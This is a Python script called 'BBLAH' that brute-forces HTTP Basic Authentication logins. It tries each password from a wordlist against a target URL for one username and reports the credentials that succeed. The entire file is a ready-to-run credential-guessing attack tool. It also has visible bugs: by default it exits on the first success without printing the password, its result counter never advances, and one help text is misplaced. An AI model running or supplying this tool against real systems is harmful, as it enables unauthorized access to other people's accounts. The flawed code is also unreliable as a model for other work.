import sys, argparse, requests
from requests.auth import HTTPBasicAuth

parser = argparse.ArgumentParser(description="BBLAH - an HTTP Basic Authentication login bruteforcer")
parser.add_argument('-t', '--target', help="The base URL supporting HTTP Basic Authentication to be bruteforced", required=False)
parser.add_argument('-u', '--username', help="The username to be bruteforced, e.g. http://example.com/phpmyadmin/", required=False)
parser.add_argument('-w', '--wordlist', help="The wordlist to use as a list of passwords (one password per line)", required=False)
parser.add_argument('-ns', '--no-stop-on-success', help="Don't stop bruteforcing when a valid login is found", required=False, action='store_true')
parser.add_argument('-v', '--verbose', help="Produce verbose output. This will print a line for each login attempt.", required=False, action='store_true')
args = parser.parse_args()

url = args.target
username = args.username
wordlist = args.wordlist
stop_on_success = not args.no_stop_on_success

if not url:
    url = input("Enter the base URP supporting HTTP Basic Authentication to be bruteforced: ")
if not username:
    username = input("Enter the username to be bruteforced: ")
if not wordlist:
    wordlist = input("Enter the wordlist file to be used as a list of passwords (one password per line): ")

found = False
valid_logins = []

print("Starting with username \033[94m\033[1m", username, "\033[0m and wordlist \033[95m\033[1m", wordlist, "\033[0m ...\n", sep='')

with open(wordlist, 'r') as f:
    for line in f:
        if not line.strip():
            continue
        if args.verbose:
            print("Trying \033[94m\033[1m", username, "\033[0m : \033[93m\033[1m", line.strip(), "\033[0m ... ", sep='', end='')
        result = requests.get(url, auth=(username, line.strip()))
        if (result.status_code == 200):
            if args.verbose:
                print("\033[92m\033[1msuccess!\033[0m")
            found = True
            valid_logins.append([username, line.strip()])
            if stop_on_success:
                sys.exit(0)
        else:
            if args.verbose:
                print("\033[91m\033[1mfailure\033[0m")

if not found:
    if args.verbose:
        print()
    print("\033[91m\033[1mFailure!\033[0m\nCould not find a valid username/password combination.\n")
else:
    if args.verbose:
        print()
    print("\033[92m\033[1mSuccess!\033[0m \033[91m\033[1m", len(valid_logins), "\033[0m valid login(s) were found:\n", sep='')
    count = 1
    for login in valid_logins:
        print(count, ". Username: \033[94m\033[1m", login[0], "\033[0m\n   Password: \033[93m\033[1m", login[1], "\033[0m", sep='')
    print()
